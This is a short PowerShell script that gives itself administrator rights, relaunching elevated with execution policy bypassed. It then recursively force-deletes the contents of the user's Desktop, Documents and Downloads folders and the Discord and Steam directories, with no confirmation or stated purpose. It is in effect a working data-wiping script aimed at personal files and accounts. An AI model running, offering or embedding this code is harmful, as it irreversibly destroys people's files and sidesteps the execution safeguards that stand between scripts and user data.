$IsAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $IsAdmin) {
    Start-Process powershell.exe `
        -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" `
        -Verb RunAs
    exit
}

$TargetPaths = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "$env:LOCALAPPDATA\Discord",
    "$env:LOCALAPPDATA\Steam",
    "$env:APPDATA\discord",
    "C:\Program Files (x86)\Steam"
)

foreach ($TargetPath in $TargetPaths) {
    if (Test-Path $TargetPath) {

        # Delete all contents inside the folder, but not the folder itself
        Get-ChildItem -LiteralPath $TargetPath -Force -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                Remove-Item -LiteralPath $_.FullName -Recurse -Force -ErrorAction Stop
                Write-Host "Deleted: $($_.FullName)"
            }
            catch {
                Write-Error "Failed to delete $($_.FullName): $_"
            }
        }

    } else {
        Write-Warning "Not found: $TargetPath"
    }
}
